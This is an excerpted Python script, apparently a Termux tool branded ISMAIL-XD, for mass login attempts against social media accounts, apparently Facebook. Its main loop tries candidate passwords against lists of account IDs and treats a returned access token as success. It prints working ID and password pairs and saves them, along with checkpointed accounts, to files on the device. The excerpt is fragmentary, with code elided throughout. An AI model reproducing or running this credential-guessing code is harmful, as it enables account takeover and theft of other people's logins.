...
BC = "\033[1;0m"
loooop = 0
#.  os.system("xdg-open https://www.github.com/Ismail290183737")
os.system('clear')
def __banner___():
...
\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92mFB         :  ANISH          
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92mGITHUB     :  ANISH                
...
try:
	os.system('clear')
	serv = requests.get('https://raw.githubusercontent.com/ISMAIL-428/SERVER/main/MAIN-SERV').text
	if "main" in serv:
		os.system('clear')
		__banner___()
...
#. os.system("xdg-open https://www.facebook.com/iam.arifinrashid")
  ...
  # os.system('xdg-open https://github.com/ARIFIN-212')
    ...
    #.  os.system('xdg-open https://https://www.facebook.com/profile.php?id=100062306186804')
...
def ___mixt___(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\033[1;32m~[\033[1;92mISMAIL-XD\033[1;32m]-[\033[1;32m{loop}\033[1;97m/\033[1;32m{str(len(id))}\033[1;32m]-\033[1;32m[\033[1;32mOK:{len(oks)}\033[1;32m] ');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\33[1;92m~[ISMAIL-OK] '+ids+' ~ '+pas+'\033[1;92m')
                #. print(f"\r\33[1;36mCOOKIES=[🐼]: {kuki}\33[1;36m")
                oks.append(ids)
                open('/sdcard/ISMAIL-OKS.txt','a').write(ids+' | '+pas+'\n')
                ...
                break
                                ...
                                if ids in oks:pass
                                        ...
                                        #print('\r\r\033[1;30m [ISMAIL-CP] \033[1;30m'+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ISMAIL-rnd-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
            else:continue
        loop+=1
